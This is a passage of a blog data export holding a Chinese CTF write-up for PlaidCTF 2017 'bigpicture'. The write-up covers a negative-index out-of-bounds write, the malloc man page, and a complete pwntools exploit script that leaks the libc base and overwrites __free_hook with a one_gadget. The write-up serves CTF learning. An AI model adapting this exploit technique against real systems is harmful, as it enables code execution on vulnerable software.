fool.\n\n嗯，真的每次找one_gadget都想SB一样，最主要的是这个工具直接给出了参数条件，良心。。。\n\n用到了一个`calloc`函数，第一次是在0CTF中遇到，和`malloc`功能相同，但是会把分配得到的内存清`0`。\n学到一个快速查看函数的方法，如：`man calloc`\n```\nMALLOC(3)                                                                                 Linux Programmer's Manual                                                                                 MALLOC(3)\n\nNAME\n       malloc, free, calloc, realloc - allocate and free dynamic memory\n\nSYNOPSIS\n       #include <stdlib.h>\n\n       void *malloc(size_t size);\n       void free(void *ptr);\n       void *calloc(size_t nmemb, size_t size);\n       void *realloc(void *ptr, size_t size);\n\nDESCRIPTION\n       The  malloc() function allocates size bytes and returns a pointer to the allocated memory.  The memory is not initialized.  If size is 0, then malloc() returns either NULL, or a unique pointer value\n       that can later be successfully passed to free().\n\n       The free() function frees the memory space pointed to by ptr, which must have been returned by a previous call to malloc(), calloc(), or realloc().  Otherwise,  or  if  free(ptr)  has  already  been\n       called before, undefined behavior occurs.  If ptr is NULL, no operation is performed.\n\n       The  calloc() function allocates memory for an array of nmemb elements of size bytes each and returns a pointer to the allocated memory.  The memory is set to zero.  If nmemb or size is 0, then cal‐\n       loc() returns either NULL, or a unique pointer value that can later be successfully passed to free().\n\n       The realloc() function changes the size of the memory block pointed to by ptr to size bytes.  The contents will be unchanged in the range from the start of the region up to the minimum  of  the  old\n       and  new  sizes.  If the new size is larger than the old size, the added memory will not be initialized.  If ptr is NULL, then the call is equivalent to malloc(size), for all values of size; if size\n       is equal to zero, and ptr is not NULL, then the call is equivalent to free(ptr).  Unless ptr is NULL, it must have been returned by an earlier call to malloc(), calloc() or realloc().  If  the  area\n       pointed to was moved, a free(ptr) is done.\n\nRETURN VALUE\n       The malloc() and calloc() functions return a pointer to the allocated memory, which is suitably aligned for any built-in type.  On error, these functions return NULL.  NULL may also be returned by a\n       successful call to malloc() with a size of zero, or by a successful call to calloc() with nmemb or size equal to zero.\n\n       The free() function returns no value.\n\n       The realloc() function returns a pointer to the newly allocated memory, which is suitably aligned for any built-in type and may be different from ptr, or NULL if the  request  fails.   If  size  was\n       equal to 0, either NULL or a pointer suitable to be passed to free() is returned.  If realloc() fails, the original block is left untouched; it is not freed or moved.\n\nERRORS\n       calloc(), malloc(), and realloc() can fail with the following error:\n\n       ENOMEM Out of memory.  Possibly, the application hit the RLIMIT_AS or RLIMIT_DATA limit described in getrlimit(2).\n\nATTRIBUTES\n       For an explanation of the terms used in this section, see attributes(7).\n\n       ┌─────────────────────┬───────────────┬─────────┐\n       │Interface            │ Attribute     │ Value   │\n       ├─────────────────────┼───────────────┼─────────┤\n       │malloc(), free(),    │ Thread safety │ MT-Safe │\n       │calloc(), realloc()  │               │         │\n       └─────────────────────┴───────────────┴─────────┘\n...\n...\n...\n```\n\n思路：\n1. 利用任意地址读泄露libc基址\n2. 将`__free_hook`修改为`one_gadget`\n\nexp：\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./bigpicture')\n    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\noffset = 0x109000 + 16\n\ndef edit(address, data):\n    t = 0\n    address -= 0x398000\n    for i in range(offset - (address - libc.address), offset - (address - libc.address) - 8, -1):\n        k = -i\n        p.recvuntil('>')\n        p.sendline('0, {}, {}'.format(k, data[t]))\n        t += 1\n\ndef pwn():\n    p.recvuntil('big?')\n    p.sendline('1000 x 1000')\n    leak_realloc = ''       # _dl_runtime_resolve_avx_slow\n#    gdb.attach(p)\n    for i in range(0x109000 - 24, 0x109000 - 30, -1):\n        k = -i\n        p.recvuntil('>')\n        p.sendline('0, {}, r'.format(k))\n        p.recvuntil('overwriting ')\n        leak_realloc = p.recv(1) + leak_realloc\n    print leak_realloc.encode('hex')\n    leak_realloc = int(leak_realloc.encode('hex'), 16)\n    libc.address = leak_realloc - libc.plt['realloc'] - 6 - 0x10\n    print 'libc.address => ', hex(libc.address)\n    __free_hook_addr = libc.symbols['__free_hook']\n    print '__free_hook => ', hex(libc.symbols['__free_hook'])\n    one_gadget = libc.address + 0x3f33a\n    print 'one_gadget => ', hex(one_gadget)\n    edit(__free_hook_addr, p64(one_gadget))\n#    gdb.attach(p)\n    p.sendline('quit')\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```","slug":"2017PlaidCTF-bigpicture","published":1,"updated":"2017-04-26T11:00:27.432Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jxk000ghv18j868erq3","content":"<h2 id=\"bigpicture\"><a href=\"#bigpicture\" class=\"headerlink\" title=\"bigpicture\"></a>bigpicture</h2><p>我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。</p>\n<p>给了c文件，良心。。可能觉得其他的pwnable都太变态了吧。。这周还有Defcon的一个外卡赛，继续观摩大佬们秒题。</p>\n<p>明显存在一个数组边界溢出，没有检查负数情况。同时分配的内存大小可控，我们可以分配得到一个mmap映射的内存，这样就相当于绕过了aslr。。</p>\n<p>推荐一个工具<strong><a href=\"https://github.com/david942j/one_gadget\" target=\"_blank\" rel=\"external\">one_gadget</a></strong>，正如作者所说</p>\n<blockquote>\n<p>This gem provides such gadgets finder, no need to use IDA-pro every time like a fool.</p>\n</blockquote>\n<p>嗯，真的每次找one_gadget都想SB一样，最主要的是这个工具直接给出了参数条件，良心。。。</p>\n<p>用到了一个<code>calloc</code>函数，第一次是在0CTF中遇到，和<code>malloc</code>功能相同，但是会把分配得到的内存清<code>0</code>。<br>学到一个快速查看函数的方法，如：<code>man calloc</code><br><figure class=\"highlight vhdl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\">MALLOC(<span class=\"number\">3</span>)                                                                                 Linux Programmer<span class=\"symbol\">'s</span> Manual                                                                                 MALLOC(<span class=\"number\">3</span>)</div><div class=\"line\"></div><div class=\"line\">NAME</div><div class=\"line\">       malloc, free, calloc, realloc - allocate <span class=\"keyword\">and</span> free dynamic memory</div><div class=\"line\"></div><div class=\"line\">SYNOPSIS</div><div class=\"line\">       #include &lt;stdlib.h&gt;</div><div class=\"line\"></div><div class=\"line\">       void *malloc(size_t size);</div><div class=\"line\">       void free(void *ptr);</div><div class=\"line\">       void *calloc(size_t nmemb, size_t size);</div><div class=\"line\">       void *realloc(void *ptr, size_t size);</div><div class=\"line\"></div><div class=\"line\">DESCRIPTION</div><div class=\"line\">       The  malloc() <span class=\"keyword\">function</span> allocates size bytes <span class=\"keyword\">and</span> returns a pointer <span class=\"keyword\">to</span> the allocated memory.  The memory <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> initialized.  <span class=\"keyword\">If</span> size <span class=\"keyword\">is</span> <span class=\"number\">0</span>, <span class=\"keyword\">then</span> malloc() returns either <span class=\"keyword\">NULL</span>, <span class=\"keyword\">or</span> a unique pointer value</div><div class=\"line\">       that can later be successfully passed <span class=\"keyword\">to</span> free().</div><div class=\"line\"></div><div class=\"line\">       The free() <span class=\"keyword\">function</span> frees the memory space pointed <span class=\"keyword\">to</span> by ptr, which must have been returned by a previous call <span class=\"keyword\">to</span> malloc(), calloc(), <span class=\"keyword\">or</span> realloc().  Otherwise,  <span class=\"keyword\">or</span>  <span class=\"keyword\">if</span>  free(ptr)  has  already  been</div><div class=\"line\">       called before, undefined behavior occurs.  <span class=\"keyword\">If</span> ptr <span class=\"keyword\">is</span> <span class=\"keyword\">NULL</span>, no operation <span class=\"keyword\">is</span> performed.</div><div class=\"line\"></div><div class=\"line\">       The  calloc() <span class=\"keyword\">function</span> allocates memory <span class=\"keyword\">for</span> an <span class=\"keyword\">array</span> <span class=\"keyword\">of</span> nmemb elements <span class=\"keyword\">of</span> size bytes each <span class=\"keyword\">and</span> returns a pointer <span class=\"keyword\">to</span> the allocated memory.  The memory <span class=\"keyword\">is</span> set <span class=\"keyword\">to</span> zero.  <span class=\"keyword\">If</span> nmemb <span class=\"keyword\">or</span> size <span class=\"keyword\">is</span> <span class=\"number\">0</span>, <span class=\"keyword\">then</span> cal‐</div><div class=\"line\">       loc() returns either <span class=\"keyword\">NULL</span>, <span class=\"keyword\">or</span> a unique pointer value that can later be successfully passed <span class=\"keyword\">to</span> free().</div><div class=\"line\"></div><div class=\"line\">       The realloc() <span class=\"keyword\">function</span> changes the size <span class=\"keyword\">of</span> the memory <span class=\"keyword\">block</span> pointed <span class=\"keyword\">to</span> by ptr <span class=\"keyword\">to</span> size bytes.  The contents will be unchanged <span class=\"keyword\">in</span> the <span class=\"keyword\">range</span> from the start <span class=\"keyword\">of</span> the region up <span class=\"keyword\">to</span> the minimum  <span class=\"keyword\">of</span>  the  old</div><div class=\"line\">       <span class=\"keyword\">and</span>  <span class=\"keyword\">new</span>  sizes.  <span class=\"keyword\">If</span> the <span class=\"keyword\">new</span> size <span class=\"keyword\">is</span> larger than the old size, the added memory will <span class=\"keyword\">not</span> be initialized.  <span class=\"keyword\">If</span> ptr <span class=\"keyword\">is</span> <span class=\"keyword\">NULL</span>, <span class=\"keyword\">then</span> the call <span class=\"keyword\">is</span> equivalent <span class=\"keyword\">to</span> malloc(size), <span class=\"keyword\">for</span> <span class=\"keyword\">all</span> values <span class=\"keyword\">of</span> size; <span class=\"keyword\">if</span> size</div><div class=\"line\">       <span class=\"keyword\">is</span> equal <span class=\"keyword\">to</span> zero, <span class=\"keyword\">and</span> ptr <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">NULL</span>, <span class=\"keyword\">then</span> the call <span class=\"keyword\">is</span> equivalent <span class=\"keyword\">to</span> free(ptr).  Unless ptr <span class=\"keyword\">is</span> <span class=\"keyword\">NULL</span>, it must have been returned by an earlier call <span class=\"keyword\">to</span> malloc(), calloc() <span class=\"keyword\">or</span> realloc().  <span class=\"keyword\">If</span>  the  area</div><div class=\"line\">       pointed <span class=\"keyword\">to</span> was moved, a free(ptr) <span class=\"keyword\">is</span> done.</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">RETURN</span> VALUE</div><div class=\"line\">       The malloc() <span class=\"keyword\">and</span> calloc() functions <span class=\"keyword\">return</span> a pointer <span class=\"keyword\">to</span> the allocated memory, which <span class=\"keyword\">is</span> suitably aligned <span class=\"keyword\">for</span> any built-<span class=\"keyword\">in</span> <span class=\"keyword\">type</span>.  <span class=\"keyword\">On</span> <span class=\"literal\">error</span>, these functions <span class=\"keyword\">return</span> <span class=\"keyword\">NULL</span>.  <span class=\"keyword\">NULL</span> may also be returned by a</div><div class=\"line\">       successful call <span class=\"keyword\">to</span> malloc() <span class=\"keyword\">with</span> a size <span class=\"keyword\">of</span> zero, <span class=\"keyword\">or</span> by a successful call <span class=\"keyword\">to</span> calloc() <span class=\"keyword\">with</span> nmemb <span class=\"keyword\">or</span> size equal <span class=\"keyword\">to</span> zero.</div><div class=\"line\"></div><div class=\"line\">       The free() <span class=\"keyword\">function</span> returns no value.</div><div class=\"line\"></div><div class=\"line\">       The realloc() <span class=\"keyword\">function</span> returns a pointer <span class=\"keyword\">to</span> the newly allocated memory, which <span class=\"keyword\">is</span> suitably aligned <span class=\"keyword\">for</span> any built-<span class=\"keyword\">in</span> <span class=\"keyword\">type</span> <span class=\"keyword\">and</span> may be different from ptr, <span class=\"keyword\">or</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">if</span> the  request  fails.   <span class=\"keyword\">If</span>  size  was</div><div class=\"line\">       equal <span class=\"keyword\">to</span> <span class=\"number\">0</span>, either <span class=\"keyword\">NULL</span> <span class=\"keyword\">or</span> a pointer suitable <span class=\"keyword\">to</span> be passed <span class=\"keyword\">to</span> free() <span class=\"keyword\">is</span> returned.  <span class=\"keyword\">If</span> realloc() fails, the original <span class=\"keyword\">block</span> <span class=\"keyword\">is</span> left untouched; it <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> freed <span class=\"keyword\">or</span> moved.</div><div class=\"line\"></div><div class=\"line\">ERRORS</div><div class=\"line\">       calloc(), malloc(), <span class=\"keyword\">and</span> realloc() can fail <span class=\"keyword\">with</span> the following <span class=\"literal\">error</span>:</div><div class=\"line\"></div><div class=\"line\">       ENOMEM <span class=\"keyword\">Out</span> <span class=\"keyword\">of</span> memory.  Possibly, the application hit the RLIMIT_AS <span class=\"keyword\">or</span> RLIMIT_DATA limit described <span class=\"keyword\">in</span> getrlimit(<span class=\"number\">2</span>).</div><div class=\"line\"></div><div class=\"line\">ATTRIBUTES</div><div class=\"line\">       <span class=\"keyword\">For</span> an explanation <span class=\"keyword\">of</span> the terms used <span class=\"keyword\">in</span> this section, see attributes(<span class=\"number\">7</span>).</div><div class=\"line\"></div><div class=\"line\">       ┌─────────────────────┬───────────────┬─────────┐</div><div class=\"line\">       │Interface            │ <span class=\"keyword\">Attribute</span>     │ Value   │</div><div class=\"line\">       ├─────────────────────┼───────────────┼─────────┤</div><div class=\"line\">       │malloc(), free(),    │ Thread safety │ MT-Safe │</div><div class=\"line\">       │calloc(), realloc()  │               │         │</div><div class=\"line\">       └─────────────────────┴───────────────┴─────────┘</div><div class=\"line\">...</div><div class=\"line\">...</div><div class=\"line\">...</div></pre></td></tr></table></figure></p>\n<p>思路：</p>\n<ol>\n<li>利用任意地址读泄露libc基址</li>\n<li>将<code>__free_hook</code>修改为<code>one_gadget</code></li>\n</ol>\n<p>exp：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> local:</div><div class=\"line\">    p = process(<span class=\"string\">'./bigpicture'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">offset = <span class=\"number\">0x109000</span> + <span class=\"number\">16</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(address, data)</span>:</span></div><div class=\"line\">    t = <span class=\"number\">0</span></div><div class=\"line\">    address -= <span class=\"number\">0x398000</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(offset - (address - libc.address), offset - (address - libc.address) - <span class=\"number\">8</span>, <span class=\"number\">-1</span>):</div><div class=\"line\">        k = -i</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">        p.sendline(<span class=\"string\">'0, &#123;&#125;, &#123;&#125;'</span>.format(k, data[t]))</div><div class=\"line\">        t += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'big?'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1000 x 1000'</span>)</div><div class=\"line\">    leak_realloc = <span class=\"string\">''</span>       <span class=\"comment\"># _dl_runtime_resolve_avx_slow</span></div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0x109000</span> - <span class=\"number\">24</span>, <span class=\"number\">0x109000</span> - <span class=\"number\">30</span>, <span class=\"number\">-1</span>):</div><div class=\"line\">        k = -i</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">        p.sendline(<span class=\"string\">'0, &#123;&#125;, r'</span>.format(k))</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'overwriting '</span>)</div><div class=\"line\">        leak_realloc = p.recv(<span class=\"number\">1</span>) + leak_realloc</div><div class=\"line\">    <span class=\"keyword\">print</span> leak_realloc.encode(<span class=\"string\">'hex'</span>)</div><div class=\"line\">    leak_realloc = int(leak_realloc.encode(<span class=\"string\">'hex'</span>), <span class=\"number\">16</span>)</div><div class=\"line\">    libc.address = leak_realloc - libc.plt[<span class=\"string\">'realloc'</span>] - <span class=\"number\">6</span> - <span class=\"number\">0x10</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'libc.address =&gt; '</span>, hex(libc.address)</div><div class=\"line\">    __free_hook_addr = libc.symbols[<span class=\"string\">'__free_hook'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'__free_hook =&gt; '</span>, hex(libc.symbols[<span class=\"string\">'__free_hook'</span>])</div><div class=\"line\">    one_gadget = libc.address + <span class=\"number\">0x3f33a</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'one_gadget =&gt; '</span>, hex(one_gadget)</div><div class=\"line\">    edit(__free_hook_addr, p64(one_gadget))</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    p.sendline(<span class=\"string\">'quit'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<h2 id=\"bigpicture\"><a href=\"#bigpicture\" class=\"headerlink\" title=\"bigpicture\"></a>bigpicture</h2><p>我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。</p>\n<p>给了c文件，良心。。可能觉得其他的pwnable都太变态了吧。。这周还有Defcon的一个外卡赛，继续观摩大佬们秒题。</p>\n<p>明显存在一个数组边界溢出，没有检查负数情况。同时分配的内存大小可控，我们可以分配得到一个mmap映射的内存，这样就相当于绕过了aslr。。</p>\n<p>推荐一个工具<strong><a href=\"https://github.com/david942j/one_gadget\">one_gadget</a></strong>，正如作者所说</p>\n<blockquote>\n<p>This gem provides such gadgets finder, no need to use IDA-pro every time like a fool.</p>\n</blockquote>\n<p>嗯，真的每次找one_gadget都想SB一样，最主要的是这个工具直接给出了参数条件，良心。。。</p>\n<p>用到了一个<code>calloc</code>函数，第一次是在0CTF中遇到，和<code>malloc</code>功能相同，但是会把分配得到的内存清<code>0</code>。<br>学到一个快速查看函数的方法，如：<code>man calloc</code><br><figure class=\"highlight vhdl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\">MALLOC(<span class=\"number\">3</span>)                                                                                 Linux Programmer<span class=\"symbol\">'s</span> Manual                                                                                 MALLOC(<span class=\"number\">3</span>)</div><div class=\"line\"></div><div class=\"line\">NAME</div><div class=\"line\">       malloc, free, calloc, realloc - allocate <span class=\"keyword\">and</span> free dynamic memory</div><div class=\"line\"></div><div class=\"line\">SYNOPSIS</div><div class=\"line\">       #include &lt;stdlib.h&gt;</div><div class=\"line\"></div><div class=\"line\">       void *malloc(size_t size);</div><div class=\"line\">       void free(void *ptr);</div><div class=\"line\">       void *calloc(size_t nmemb, size_t size);</div><div class=\"line\">       void *realloc(void *ptr, size_t size);</div><div class=\"line\"></div><div class=\"line\">DESCRIPTION</div><div class=\"line\">       The  malloc() <span class=\"keyword\">function</span> allocates size bytes <span class=\"keyword\">and</span> returns a pointer <span class=\"keyword\">to</span> the allocated memory.  The memory <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> initialized.  <span class=\"keyword\">If</span> size <span class=\"keyword\">is</span> <span class=\"number\">0</span>, <span class=\"keyword\">then</span> malloc() returns either <span class=\"keyword\">NULL</span>, <span class=\"keyword\">or</span> a unique pointer value</div><div class=\"line\">       that can later be successfully passed <span class=\"keyword\">to</span> free().</div><div class=\"line\"></div><div class=\"line\">       The free() <span class=\"keyword\">function</span> frees the memory space pointed <span class=\"keyword\">to</span> by ptr, which must have been returned by a previous call <span class=\"keyword\">to</span> malloc(), calloc(), <span class=\"keyword\">or</span> realloc().  Otherwise,  <span class=\"keyword\">or</span>  <span class=\"keyword\">if</span>  free(ptr)  has  already  been</div><div class=\"line\">       called before, undefined behavior occurs.  <span class=\"keyword\">If</span> ptr <span class=\"keyword\">is</span> <span class=\"keyword\">NULL</span>, no operation <span class=\"keyword\">is</span> performed.</div><div class=\"line\"></div><div class=\"line\">       The  calloc() <span class=\"keyword\">function</span> allocates memory <span class=\"keyword\">for</span> an <span class=\"keyword\">array</span> <span class=\"keyword\">of</span> nmemb elements <span class=\"keyword\">of</span> size bytes each <span class=\"keyword\">and</span> returns a pointer <span class=\"keyword\">to</span> the allocated memory.  The memory <span class=\"keyword\">is</span> set <span class=\"keyword\">to</span> zero.  <span class=\"keyword\">If</span> nmemb <span class=\"keyword\">or</span> size <span class=\"keyword\">is</span> <span class=\"number\">0</span>, <span class=\"keyword\">then</span> cal‐</div><div class=\"line\">       loc() returns either <span class=\"keyword\">NULL</span>, <span class=\"keyword\">or</span> a unique pointer value that can later be successfully passed <span class=\"keyword\">to</span> free().</div><div class=\"line\"></div><div class=\"line\">       The realloc() <span class=\"keyword\">function</span> changes the size <span class=\"keyword\">of</span> the memory <span class=\"keyword\">block</span> pointed <span class=\"keyword\">to</span> by ptr <span class=\"keyword\">to</span> size bytes.  The contents will be unchanged <span class=\"keyword\">in</span> the <span class=\"keyword\">range</span> from the start <span class=\"keyword\">of</span> the region up <span class=\"keyword\">to</span> the minimum  <span class=\"keyword\">of</span>  the  old</div><div class=\"line\">       <span class=\"keyword\">and</span>  <span class=\"keyword\">new</span>  sizes.  <span class=\"keyword\">If</span> the <span class=\"keyword\">new</span> size <span class=\"keyword\">is</span> larger than the old size, the added memory will <span class=\"keyword\">not</span> be initialized.  <span class=\"keyword\">If</span> ptr <span class=\"keyword\">is</span> <span class=\"keyword\">NULL</span>, <span class=\"keyword\">then</span> the call <span class=\"keyword\">is</span> equivalent <span class=\"keyword\">to</span> malloc(size), <span class=\"keyword\">for</span> <span class=\"keyword\">all</span> values <span class=\"keyword\">of</span> size; <span class=\"keyword\">if</span> size</div><div class=\"line\">       <span class=\"keyword\">is</span> equal <span class=\"keyword\">to</span> zero, <span class=\"keyword\">and</span> ptr <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">NULL</span>, <span class=\"keyword\">then</span> the call <span class=\"keyword\">is</span> equivalent <span class=\"keyword\">to</span> free(ptr).  Unless ptr <span class=\"keyword\">is</span> <span class=\"keyword\">NULL</span>, it must have been returned by an earlier call <span class=\"keyword\">to</span> malloc(), calloc() <span class=\"keyword\">or</span> realloc().  <span class=\"keyword\">If</span>  the  area</div><div class=\"line\">       pointed <span class=\"keyword\">to</span> was moved, a free(ptr) <span class=\"keyword\">is</span> done.</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">RETURN</span> VALUE</div><div class=\"line\">       The malloc() <span class=\"keyword\">and</span> calloc() functions <span class=\"keyword\">return</span> a pointer <span class=\"keyword\">to</span> the allocated memory, which <span class=\"keyword\">is</span> suitably aligned <span class=\"keyword\">for</span> any built-<span class=\"keyword\">in</span> <span class=\"keyword\">type</span>.  <span class=\"keyword\">On</span> <span class=\"literal\">error</span>, these functions <span class=\"keyword\">return</span> <span class=\"keyword\">NULL</span>.  <span class=\"keyword\">NULL</span> may also be returned by a</div><div class=\"line\">       successful call <span class=\"keyword\">to</span> malloc() <span class=\"keyword\">with</span> a size <span class=\"keyword\">of</span> zero, <span class=\"keyword\">or</span> by a successful call <span class=\"keyword\">to</span> calloc() <span class=\"keyword\">with</span> nmemb <span class=\"keyword\">or</span> size equal <span class=\"keyword\">to</span> zero.</div><div class=\"line\"></div><div class=\"line\">       The free() <span class=\"keyword\">function</span> returns no value.</div><div class=\"line\"></div><div class=\"line\">       The realloc() <span class=\"keyword\">function</span> returns a pointer <span class=\"keyword\">to</span> the newly allocated memory, which <span class=\"keyword\">is</span> suitably aligned <span class=\"keyword\">for</span> any built-<span class=\"keyword\">in</span> <span class=\"keyword\">type</span> <span class=\"keyword\">and</span> may be different from ptr, <span class=\"keyword\">or</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">if</span> the  request  fails.   <span class=\"keyword\">If</span>  size  was</div><div class=\"line\">       equal <span class=\"keyword\">to</span> <span class=\"number\">0</span>, either <span class=\"keyword\">NULL</span> <span class=\"keyword\">or</span> a pointer suitable <span class=\"keyword\">to</span> be passed <span class=\"keyword\">to</span> free() <span class=\"keyword\">is</span> returned.  <span class=\"keyword\">If</span> realloc() fails, the original <span class=\"keyword\">block</span> <span class=\"keyword\">is</span> left untouched; it <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> freed <span class=\"keyword\">or</span> moved.</div><div class=\"line\"></div><div class=\"line\">ERRORS</div><div class=\"line\">       calloc(), malloc(), <span class=\"keyword\">and</span> realloc() can fail <span class=\"keyword\">with</span> the following <span class=\"literal\">error</span>:</div><div class=\"line\"></div><div class=\"line\">       ENOMEM <span class=\"keyword\">Out</span> <span class=\"keyword\">of</span> memory.  Possibly, the application hit the RLIMIT_AS <span class=\"keyword\">or</span> RLIMIT_DATA limit described <span class=\"keyword\">in</span> 